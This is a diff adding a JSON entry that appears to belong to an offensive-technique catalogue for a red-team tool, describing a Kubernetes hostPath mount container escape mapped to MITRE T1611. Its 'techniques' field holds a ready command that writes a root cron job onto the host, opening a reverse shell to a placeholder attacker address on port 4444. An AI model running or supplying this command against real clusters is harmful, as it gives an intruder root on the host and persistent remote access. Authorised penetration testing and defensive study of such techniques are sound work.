@@ -1,0 +1,19 @@
+[
+  {
+    "id": "cesc-001",
+    "category": "cloud",
+    "subcategory": "container_escape",
+    "title": "HostPath Mount Escape",
+    "description": "If a hostPath volume is mounted, write to the host filesystem to escape the container.",
+    "techniques": [
+      "findmnt -l | grep hostPath",
+      "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > /host/etc/cron.d/escape"
+    ],
+    "indicators": ["hostPath mounts visible in mount output", "Write access to hostPath volume"],
+    "prerequisites": ["hostPath volume mounted", "Write access to mount point"],
+    "tools": ["check_mounts"],
+    "tags": ["hostpath", "mount", "escape", "container"],
+    "confidence": 0.9,
+    "mitre_attack": "T1611"
+  }
+]
